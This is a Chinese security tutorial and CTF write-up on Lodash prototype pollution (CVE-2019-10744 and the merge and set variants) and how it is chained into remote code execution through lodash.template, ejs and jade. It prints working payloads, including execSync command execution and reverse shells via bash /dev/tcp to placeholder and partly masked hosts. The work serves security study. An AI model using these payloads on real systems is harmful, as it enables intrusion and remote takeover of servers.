> 原文链接: https://www.anquanke.com//post/id/248170 


# 从 Lodash 原型链污染到模板 RCE


                                阅读量   
                                **25284**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t0123c393898c1952d4.jpg)](https://p0.ssl.qhimg.com/t0123c393898c1952d4.jpg)





## Lodash 模块原型链污染

Lodash 是一个 JavaScript 库，包含简化字符串、数字、数组、函数和对象编程的工具，可以帮助程序员更有效地编写和维护 JavaScript 代码。并且是一个流行的 npm 库，仅在GitHub 上就有超过 400 万个项目使用，Lodash的普及率非常高，每月的下载量超过 8000 万次。但是这个库中有几个严重的原型污染漏洞。

### <a class="reference-link" name="lodash.defaultsDeep%20%E6%96%B9%E6%B3%95%E9%80%A0%E6%88%90%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88CVE-2019-10744%EF%BC%89"></a>lodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）

2019 年 7 月 2 日，[Snyk 发布了一个高严重性原型污染安全漏洞](https://snyk.io/vuln/SNYK-JS-LODASH-450202)（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。

Lodash 库中的 `defaultsDeep` 函数可能会被包含 `constructor` 的 Payload 诱骗添加或修改`Object.prototype` 。最终可能导致 Web 应用程序崩溃或改变其行为，具体取决于受影响的用例。以下是 Snyk 给出的此漏洞验证 POC：

```
const mergeFn = require('lodash').defaultsDeep;
const payload = '`{`"constructor": `{`"prototype": `{`"whoami": "Vulnerable"`}``}``}`'

function check() `{`
    mergeFn(`{``}`, JSON.parse(payload));
    if ((`{``}`)[`a0`] === true) `{`
        console.log(`Vulnerable to Prototype Pollution via $`{`payload`}``);
    `}`
  `}`

check();
```

我们在 `mergeFn(`{``}`, JSON.parse(payload));` 处下断点，单步结束后可以看到：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017b7aaa5f76a65a44.png)

成功在 `__proto__` 属性中添加了一个 `whoami` 属性，值为 `Vulnerable`，污染成功。

该漏洞披露之后，Lodash 于 7 月 9 日发布了 4.17.12 版本，其中包括 Snyk 修复和修复漏洞。我们可以参考一下 Snyk 的工程师 [Kirill](https://github.com/kirill89) 发布到 GitHub 上的 lodash JavaScript 库存储库 [https://github.com/lodash/lodash/pull/4336/files](https://github.com/lodash/lodash/pull/4336/files) 的实际安全修复：

[![](https://p1.ssl.qhimg.com/t017764c58c9040690f.png)](https://p1.ssl.qhimg.com/t017764c58c9040690f.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01eb1feba09eef77c2.png)

该修复包括以下两项安全检查：
<li>过滤了 `constructor` 以确保我们不会污染全局对象`constructor`
</li>
- 还添加了一个测试用例以确保将来不会发生回归
### <a class="reference-link" name="lodash.merge%20%E6%96%B9%E6%B3%95%E9%80%A0%E6%88%90%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"></a>lodash.merge 方法造成的原型链污染

Lodash.merge 作为 lodash 中的对象合并插件，他可以**递归**合并 `sources` 来源对象自身和继承的可枚举属性到 `object` 目标对象，以创建父映射对象：

```
merge(object, sources)
```

当两个键相同时，生成的对象将具有最右边的键的值。如果多个对象相同，则新生成的对象将只有一个与这些对象相对应的键和值。但是这里的 lodash.merge 操作实际上存在原型链污染漏洞，下面对其进行简单的分析，这里使用 4.17.4 版本的 Lodash。
- node_modules/lodash/merge.js
[![](https://p2.ssl.qhimg.com/t01366e7ce652719b24.png)](https://p2.ssl.qhimg.com/t01366e7ce652719b24.png)

merge.js 调用了 baseMerge 方法，则定位到 baseMerge：
- node_modules/lodash/_baseMerge.js
[![](https://p3.ssl.qhimg.com/t013fd1c87013bd1ba3.png)](https://p3.ssl.qhimg.com/t013fd1c87013bd1ba3.png)

如果 srcValue 是一个对象则进入 baseMergeDeep 方法，跟进 baseMergeDeep 方法：
- node_modules/lodash/_baseMergeDeep.js
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013be25c1a0cefabb8.png)

跟进 assignMergeValue 方法：
- node_modules/lodash/_assignMergeValue.js：
[![](https://p1.ssl.qhimg.com/t01583a2a0b5050a2e0.png)](https://p1.ssl.qhimg.com/t01583a2a0b5050a2e0.png)

跟进 baseAssignValue 方法：
- node_modules/lodash/_baseAssignValue.js
[![](https://p4.ssl.qhimg.com/t016516a18b7e3c263a.png)](https://p4.ssl.qhimg.com/t016516a18b7e3c263a.png)

这里的 if 判断可以绕过，最终进入 `object[key] = value` 的赋值操作。

下面给出一个验证漏洞的 POC：

```
var lodash= require('lodash');
var payload = '`{`"__proto__":`{`"whoami":"Vulnerable"`}``}`';

var a = `{``}`;
console.log("Before whoami: " + a.whoami);
lodash.merge(`{``}`, JSON.parse(payload));
console.log("After whoami: " + a.whoami);
```

我们在 `lodash.merge(`{``}`, JSON.parse(payload));` 处下断点，单步结束后可以看到：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c4ee0f5c106dba15.png)

成功在类型为 Object 的 a 对象的 `__proto__` 属性中添加了一个 `whoami` 属性，值为 `Vulnerable`，污染成功。

在 lodash.merge 方法造成的原型链污染中，为了实现代码执行，我们常常会污染 `sourceURL` 属性，即给所有 Object 对象中都插入一个 `sourceURL` 属性，然后通过 lodash.template 方法中的拼接实现任意代码执行漏洞。后文中我们会通过 [Code-Breaking 2018] Thejs 这道题来仔细讲解。

### <a class="reference-link" name="lodash.mergeWith%20%E6%96%B9%E6%B3%95%E9%80%A0%E6%88%90%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"></a>lodash.mergeWith 方法造成的原型链污染

这个方法类似于 `merge` 方法。但是它还会接受一个 `customizer`，以决定如何进行合并。 如果 `customizer` 返回 `undefined` 将会由合并处理方法代替。

```
mergeWith(object, sources, [customizer])
```

该方法与 `merge` 方法一样存在原型链污染漏洞，下面给出一个验证漏洞的 POC：

```
var lodash= require('lodash');
var payload = '`{`"__proto__":`{`"whoami":"Vulnerable"`}``}`';

var a = `{``}`;
console.log("Before whoami: " + a.whoami);
lodash.mergeWith(`{``}`, JSON.parse(payload));
console.log("After whoami: " + a.whoami);
```

我们在 `lodash.mergeWith(`{``}`, JSON.parse(payload));` 处下断点，单步结束后可以看到：

[![](https://p4.ssl.qhimg.com/t0181831a91bb27dbaf.png)](https://p4.ssl.qhimg.com/t0181831a91bb27dbaf.png)

成功在类型为 Object 的 a 对象的 `__proto__` 属性中添加了一个 `whoami` 属性，值为 `Vulnerable`，污染成功。

### <a class="reference-link" name="lodash.set%20%E6%96%B9%E6%B3%95%E9%80%A0%E6%88%90%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"></a>lodash.set 方法造成的原型链污染

Lodash.set 方法可以用来设置值到对象对应的属性路径上，如果没有则创建这部分路径。 缺少的索引属性会创建为数组，而缺少的属性会创建为对象。

```
set(object, path, value)
```
- 示例：
```
var object = `{` 'a': [`{` 'b': `{` 'c': 3 `}` `}`] `}`;

_.set(object, 'a[0].b.c', 4);
console.log(object.a[0].b.c);
// =&gt; 4

_.set(object, 'x[0].y.z', 5);
console.log(object.x[0].y.z);
// =&gt; 5
```

在使用 Lodash.set 方法时，如果没有对传入的参数进行过滤，则可能会造成原型链污染。下面给出一个验证漏洞的 POC：

```
var lodash= require('lodash');

var object_1 = `{` 'a': [`{` 'b': `{` 'c': 3 `}` `}`] `}`;
var object_2 = `{``}`

console.log(object_1.whoami);
//lodash.set(object_2, 'object_2["__proto__"]["whoami"]', 'Vulnerable');
lodash.set(object_2, '__proto__.["whoami"]', 'Vulnerable');
console.log(object_1.whoami);
```

我们在 `lodash.set(object_2, '__proto__.["whoami"]', 'Vulnerable');` 处下断点，单步结束后可以看到：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0159d0331f94becfc3.png)

在类型为 Array 的 object**1 对象的 `<em>_proto**</em>`属性中出现了一个`whoami`属性，值为`Vulnerable`，污染成功。

### <a class="reference-link" name="lodash.setWith%20%E6%96%B9%E6%B3%95%E9%80%A0%E6%88%90%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"></a>lodash.setWith 方法造成的原型链污染

Lodash.setWith 方法类似 `set` 方法。但是它还会接受一个 `customizer`，用来调用并决定如何设置对象路径的值。 如果 `customizer` 返回 `undefined` 将会有它的处理方法代替。

```
setWith(object, path, value, [customizer])
```

该方法与 `set` 方法一样可以进行原型链污染，下面给出一个验证漏洞的 POC：

```
var lodash= require('lodash');

var object_1 = `{` 'a': [`{` 'b': `{` 'c': 3 `}` `}`] `}`;
var object_2 = `{``}`

console.log(object_1.whoami);
//lodash.setWith(object_2, 'object_2["__proto__"]["whoami"]', 'Vulnerable');
lodash.setWith(object_2, '__proto__.["whoami"]', 'Vulnerable');
console.log(object_1.whoami);
```

我们在 `lodash.setWith(object_2, '__proto__.["whoami"]', 'Vulnerable');` 处下断点，单步结束后可以看到：

[![](https://p1.ssl.qhimg.com/t0135857e9e63119718.png)](https://p1.ssl.qhimg.com/t0135857e9e63119718.png)

在类型为 Array 的 object**1 对象的 `<em>_proto**</em>`属性中出现了一个`whoami`属性，值为`Vulnerable`，污染成功。

至此，我们已经对 lodash 模块中的几个原型链污染做了验证，可以成功污染原型中的属性。但如果要进行代码执行，则还需要配合 `eval()` 方法的执行或模板引擎的渲染。



## 配合 lodash.template 实现 RCE

Lodash.template 是 Lodash 中的一个简单的模板引擎，创建一个预编译模板方法，可以插入数据到模板中 “interpolate” 分隔符相应的位置。 详情请看：[http://lodash.think2011.net/template](http://lodash.think2011.net/template)

在 Lodash 的原型链污染中，为了实现代码执行，我们常常会污染 template 中的 `sourceURL` 属性，即给所有 Object 对象中都插入一个 `sourceURL` 属性，然后通过 lodash.template 方法中的拼接实现任意代码执行漏洞。下面我们通过 [Code-Breaking 2018] Thejs 这道题来仔细讲解。

### <a class="reference-link" name="%5BCode-Breaking%202018%5DThejs"></a>[Code-Breaking 2018]Thejs

进入题目，主页如下：

[![](https://p4.ssl.qhimg.com/t016311328907a1365d.png)](https://p4.ssl.qhimg.com/t016311328907a1365d.png)

关键源码如下：
- server.js
```
const fs = require('fs')
const express = require('express')
const bodyParser = require('body-parser')
const lodash = require('lodash')
const session = require('express-session')
const randomize = require('randomatic')

const app = express()
app.use(bodyParser.urlencoded(`{`extended: true`}`)).use(bodyParser.json())    // 使用 json 解析 body
app.use('/static', express.static('static'))
app.use(session(`{`    // 启用 session
    name: 'thejs.session',
    secret: randomize('aA0', 16),
    resave: false,
    saveUninitialized: false
`}`))
app.engine('ejs', function (filePath, options, callback) `{`    // 设置使用 ejs 模板引擎 
    fs.readFile(filePath, (err, content) =&gt; `{`
        if (err) return callback(new Error(err))
        let compiled = lodash.template(content)    // 使用 lodash.template 创建一个预编译模板方法供后面使用
        let rendered = compiled(`{`...options`}`)

        return callback(null, rendered)
    `}`)
`}`)
app.set('views', './views')
app.set('view engine', 'ejs')

app.all('/', (req, res) =&gt; `{`
    let data = req.session.data || `{`language: [], category: []`}`
    if (req.method == 'POST') `{`
        data = lodash.merge(data, req.body)    // 将用户提交的数据合并到 req.session.data 中去
        req.session.data = data
    `}`

    res.render('index', `{`
        language: data.language, 
        category: data.category
    `}`)
`}`)

app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))
```

代码很简单，就是将用户提交的信息，用 `lodash.merge` 方法合并到 session 里面去，多次提交， session 里最终保存你提交的所有信息。这里的 `lodash.merge` 操作存在原型链污染漏洞无需多言，下面给出解题的 payload：

```
`{`"__proto__":`{`"sourceURL":"\u000areturn e =&gt;`{`return global.process.mainModule.constructor._load('child_process').execSync('id')`}`"`}``}`
```

为什么要污染 sourceURL 呢？我们看到 `lodash.template` 的代码：[https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165](https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165)

```
// Use a sourceURL for easier debugging.
var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\n' : '';
// ...
var result = attempt(function() `{`
  return Function(importsKeys, sourceURL + 'return ' + source)
  .apply(undefined, importsValues);
`}`);
```

可以看到 sourceURL 属性是通过一个三目运算法赋值，其默认值为空。再往下看可以发现 sourceURL 被拼接进 Function 函数构造器的第二个参数，造成任意代码执行漏洞。所以我们通过原型链污染 sourceURL 参数构造 chile_process.exec 就可以执行任意代码了。但是要注意，Function 环境下没有 `require` 函数，直接使用`require('child_process')` 会报错，所以我们要用 `global.process.mainModule.constructor._load` 来代替。

我们将 payload 以 Json 的形式发送给后端，因为 express 框架支持根据 Content-Type 来解析请求 Body，为我们注入原型提供了很大方便：

[![](https://p5.ssl.qhimg.com/t0188c37ffe2f9650a4.png)](https://p5.ssl.qhimg.com/t0188c37ffe2f9650a4.png)

如上图所示，成功执行 `id` 命令。



## 配合 ejs 模板引擎实现 RCE

Nodejs 的 ejs 模板引擎存在一个利用原型污染进行 RCE 的一个漏洞。但要实现 RCE，首先需要有原型链污染，这里我们暂且使用 lodash.merge 方法中的原型链污染漏洞。
- app.js
```
var express = require('express');
var lodash = require('lodash');
var ejs = require('ejs');

var app = express();
//设置模板的位置与种类
app.set('views', __dirname);
app.set('views engine','ejs');

//对原型进行污染
var malicious_payload = '`{`"__proto__":`{`"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'calc\');var __tmp2"`}``}`';
lodash.merge(`{``}`, JSON.parse(malicious_payload));

//进行渲染
app.get('/', function (req, res) `{`
    res.render ("index.ejs",`{`
        message: 'whoami test'
    `}`);
`}`);

//设置http
var server = app.listen(8000, function () `{`

    var host = server.address().address
    var port = server.address().port

    console.log("应用实例，访问地址为 http://%s:%s", host, port)
`}`);
```
- index.ejs
```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;h1&gt;&lt;%= message%&gt;&lt;/h1&gt;

&lt;/body&gt;
&lt;/html&gt;
```

运行 app.js 后访问 8000 端口，成功弹出计算器：

[![](https://p1.ssl.qhimg.com/t013c231ddef12566a5.png)](https://p1.ssl.qhimg.com/t013c231ddef12566a5.png)

下面我们开始分析。

刚开始的 `lodash.merge` 原型链污染没有什么可说的，在 `lodash.merge(`{``}`, JSON.parse(malicious_payload));` 处下断点，单步结束后可以看到：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c6fde083d5eb305c.png)

成功在 `__proto__` 中出污染了一个 `outputFunctionName` 属性，值为 `_tmp1;global.process.mainModule.require(\'child_process\').exec(\'calc\');var __tmp2`。

但为什么要污染一个 `outputFunctionName` 属性呢？我们继续往下看。我们从 index.js::res.render 处开始，跟进 render 方法：
- node_modules/express/lib/response.js
[![](https://p5.ssl.qhimg.com/t01a6c4f5d7df359c66.png)](https://p5.ssl.qhimg.com/t01a6c4f5d7df359c66.png)

跟进到 app.render 方法：
- node_modules/express/lib/application.js
[![](https://p0.ssl.qhimg.com/t01f2f3f4d0aa3430f1.png)](https://p0.ssl.qhimg.com/t01f2f3f4d0aa3430f1.png)

发现最终会进入到 app.render 方法里的 tryRender 函数，跟进到 tryRender：
- node_modules/express/lib/application.js
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0138f8aad0f5d10a2c.png)

调用了 `view.render` 方法，继续跟进 `view.render` ：
- node_modules/express/lib/view.js
[![](https://p0.ssl.qhimg.com/t0151bf00d01ac8873b.png)](https://p0.ssl.qhimg.com/t0151bf00d01ac8873b.png)

至此调用了 `engine`，也就是说从这里进入到了模板渲染引擎 `ejs.js` 中。跟进 `ejs.js` 中的 renderFile 方法：
- node_modules/ejs/ejs.js
[![](https://p4.ssl.qhimg.com/t013b56c3f6ba29b119.png)](https://p4.ssl.qhimg.com/t013b56c3f6ba29b119.png)

发现 renderFile 中又调用了 tryHandleCache 方法，跟进 tryHandleCache：
- node_modules/ejs/ejs.js
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019c31ddb904e7e82f.png)

进入到 handleCache 方法，跟进 handleCache：
- node_modules/ejs/ejs.js
[![](https://p2.ssl.qhimg.com/t010b76e57ef35e8bb8.png)](https://p2.ssl.qhimg.com/t010b76e57ef35e8bb8.png)

在 handleCache 中找到了渲染模板的 compile 方法，跟进 compile：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014e8db4d019656690.png)

发现在 compile 中存在大量的渲染拼接。这里将 `opts.outputFunctionName` 拼接到 prepended 中，prepended 在最后会被传递给 this.source 并被带入函数执行。所以如果我们能够污染 `opts.outputFunctionName`，就能将我们构造的 payload 拼接进 js 语句中，并在 ejs 渲染时进行 RCE。在 ejs 中还有一个 `render` 方法，其最终也是进入了 `compile`。最后给出几个 ejs 模板引擎 RCE 常用的 POC：

```
`{`"__proto__":`{`"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').execSync('calc');var __tmp2"`}``}`

`{`"__proto__":`{`"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec('calc');var __tmp2"`}``}`

`{`"__proto__":`{`"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\"');var __tmp2"`}``}`
```

### <a class="reference-link" name="%5BXNUCA%202019%20Qualifier%5DHardjs"></a>[XNUCA 2019 Qualifier]Hardjs

进入题目是一个登录页面：

[![](https://p4.ssl.qhimg.com/t0139938a086c6ae730.png)](https://p4.ssl.qhimg.com/t0139938a086c6ae730.png)

关键源码如下：
- server.js
```
const fs = require('fs')
const express = require('express')
const bodyParser = require('body-parser')
const lodash = require('lodash')
const session = require('express-session')
const randomize = require('randomatic')
const mysql = require('mysql')
const mysqlConfig = require("./config/mysql")
const ejs = require('ejs')

...

app.get("/get",auth,async function(req,res,next)`{`

    var userid = req.session.userid ; 
    var sql = "select count(*) count from `html` where userid= ?"
    // var sql = "select `dom` from  `html` where userid=? ";
    var dataList = await query(sql,[userid]);

    if(dataList[0].count == 0 )`{`
        res.json(`{``}`)

    `}`else if(dataList[0].count &gt; 5) `{` // if len &gt; 5 , merge all and update mysql

        console.log("Merge the recorder in the database."); 

        var sql = "select `id`,`dom` from  `html` where userid=? ";
        var raws = await query(sql,[userid]);
        var doms = `{``}`
        var ret = new Array(); 

        for(var i=0;i&lt;raws.length ;i++)`{`
            lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));    // 漏洞点

            var sql = "delete from `html` where id = ?";
            var result = await query(sql,raws[i].id);
        `}`
        var sql = "insert into `html` (`userid`,`dom`) values (?,?) ";
        var result = await query(sql,[userid, JSON.stringify(doms) ]);

        if(result.affectedRows &gt; 0)`{`
            ret.push(doms);
            res.json(ret);
        `}`else`{`
            res.json([`{``}`]);
        `}`

    `}`else `{`

        console.log("Return recorder is less than 5,so return it without merge.");
        var sql = "select `dom` from  `html` where userid=? ";
        var raws = await query(sql,[userid]);
        var ret = new Array();

        for( var i =0 ;i&lt; raws.length ; i++)`{`
            ret.push(JSON.parse( raws[i].dom ));
        `}`

        console.log(ret);
        res.json(ret);
    `}`

`}`);

...
```

查看 /get 路由的逻辑，可以看到当条数大于五条时会触 merge 发合并操作，并且使用的是 `lodash.defaultsDeep`，这个方法存在原型链污染，在前文已经分析过不在多说。发现题目还使用了 ejs 模板引擎，我们可以通过 ejs 模板引擎进行 RCE。下面给出 payload：

```
`{`"type": "test", "content": `{`"constructor": `{`"prototype": `{`"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1\"');var __tmp2"`}``}``}``}`
```

向 `/add` 路由发送 6 次请求：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01aabac1b5a6b2103a.png)

然后访问 `/get` 路由进行原型链污染，最后访问 `/` 或 `/login` 路由触发 `render` 函数进行 ejs 模板 RCE，成功反弹 Shell：

[![](https://p0.ssl.qhimg.com/t01946502e8021a8ed0.png)](https://p0.ssl.qhimg.com/t01946502e8021a8ed0.png)



## 配合 jade 模板引擎实现 RCE

Nodejs 的 jade 模板引擎存在一个利用原型污染进行 RCE 的一个漏洞。但要实现 RCE，首先需要有原型链污染，这里我们暂且使用 lodash.merge 方法中的原型链污染漏洞。
- app.js
```
var express = require('express');
var lodash= require('lodash');
var jade = require('jade');

var app = express();
//设置模板的位置与种类
app.set('views', __dirname);
app.set("view engine", "jade");

//对原型进行污染
var malicious_payload = '`{`"__proto__":`{`"compileDebug":1,"self":1,"line":"console.log(global.process.mainModule.require(\'child_process\').execSync(\'calc\'))"`}``}`';
lodash.merge(`{``}`, JSON.parse(malicious_payload));

//进行渲染
app.get('/', function (req, res) `{`
    res.render ("index.jade",`{`
        message: 'whoami test'
    `}`);
`}`);

//设置http
var server = app.listen(8000, function () `{`

    var host = server.address().address
    var port = server.address().port

    console.log("应用实例，访问地址为 http://%s:%s", host, port)
`}`);
```
- index.jade
```
h1 #`{`message`}`
p #`{`message`}`
```

运行 app.js 后访问 8000 端口，成功弹出计算器：

[![](https://p4.ssl.qhimg.com/t01d3bc5a1cc1b99a02.png)](https://p4.ssl.qhimg.com/t01d3bc5a1cc1b99a02.png)

下面我们开始分析。

Jade 模板引擎 RCE 的挖掘思路和 ejs 模板的思路很像，当开始都是：`res.render` =&gt; `app.render` =&gt; `tryRender` =&gt; `view.render` =&gt; `this.engine`，然后从 `engine` 开始进入 jade 模板，jade 入口是 `exports.__express`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014f713c38c2fc8b31.png)

首先可以看到 `options.compileDebug` 无初始值，所以我们可以通过原型污染覆盖开启 Debug 模式，即：

```
`{`"__proto__":`{`"compileDebug":1`}``}`
```

然后会进入 `renderFile` 方法，跟进之：
- node_modules/jade/lib/index.js
[![](https://p0.ssl.qhimg.com/t01b48ca7d4be2b3bbf.png)](https://p0.ssl.qhimg.com/t01b48ca7d4be2b3bbf.png)

返回的时候进入了 handleTemplateCache 方法，跟进 handleTemplateCache：
- node_modules/jade/lib/index.js
[![](https://p1.ssl.qhimg.com/t0151a05f52766ed36d.png)](https://p1.ssl.qhimg.com/t0151a05f52766ed36d.png)

进入 complie 方法，跟进 complie：
- node_modules/jade/lib/index.js
[![](https://p5.ssl.qhimg.com/t01fad20f8069ff8752.png)](https://p5.ssl.qhimg.com/t01fad20f8069ff8752.png)

Jade 模板和 ejs 不同，在 compile 编译之前会有 parse 解析，跟进 parse：
- node_modules/jade/lib/index.js
[![](https://p0.ssl.qhimg.com/t01c6f1ffe0fe53f251.png)](https://p0.ssl.qhimg.com/t01c6f1ffe0fe53f251.png)

在 parse 中先经过 `parser.parse` 解析，然后由 `compiler.compile` 进行编译，最后返回编译后代码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ee0717b0149817e1.png)

但是在 `body` 中存在发现报错处理入口 `addWith`，只要不进入这个条件分支就可以避免报错了，也就需要我们通过原型污染将 self 覆盖为 true：

```
`{`"__proto__":`{`"compileDebug":1,"self":1`}``}`
```

然后我们回过头来跟进 `compiler.compile`，看看其作用：
- node_modules/jade/lib/compiler.js
[![](https://p4.ssl.qhimg.com/t01f4bc7a1844747d6e.png)](https://p4.ssl.qhimg.com/t01f4bc7a1844747d6e.png)

首先，编译后代码会存放在 `this.buf` 中，然后通过 `this.visit(this.node)` 遍历分析 parse 产生的 AST 树 this.node，跟进 visit：
- node_modules/jade/lib/compiler.js
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0131c9444c12433d88.png)

可以看到，如果 debug 为真，则 `node.line` 就会被 push 进去，并造成拼接，然后就可以返回 buf 部分进行命令执行。所以最终的 Payload 如下：

```
`{`"__proto__":`{`"compileDebug":1,"self":1,"line":"console.log(global.process.mainModule.require('child_process').execSync('calc'))"`}``}`
```



## Ending……

[![](https://p4.ssl.qhimg.com/t019b0c8507aa774c43.png)](https://p4.ssl.qhimg.com/t019b0c8507aa774c43.png)
